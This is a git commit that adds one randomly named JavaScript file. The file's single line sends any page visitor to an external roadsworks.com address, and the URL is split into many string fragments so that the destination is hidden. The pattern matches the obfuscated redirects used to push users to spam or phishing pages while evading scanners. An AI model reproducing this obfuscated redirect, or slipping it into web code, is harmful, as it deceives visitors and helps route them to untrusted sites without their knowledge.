47df258d77384c1b6c4d7a00f7ac97e7113dba9a
Parabeauty <113865732+Parabeauty@users.noreply.github.com>
2022-12-05 12:18:01 +0100

    Create jhsgfdusyegfuysefufydgcudyfe.js

---
+++ jhsgfdusyegfuysefufydgcudyfe.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://ww`,`w.road`,`swor`,`ks.co`,`m/V0p`,`0ljJE`,`cXBBo`,`h1Zf2`,`-7c7sPV`,`MFndRnK`,`f7sUF`,`Bga_6rK`,`b-u8v`,`-tw-C1b`,`LYRmPJ`,`cUQL1J1P`,`D0DqJp`,`hMrUkJ`,`EH1Q~~/TA`,`HA/8upyjbvjtl`))
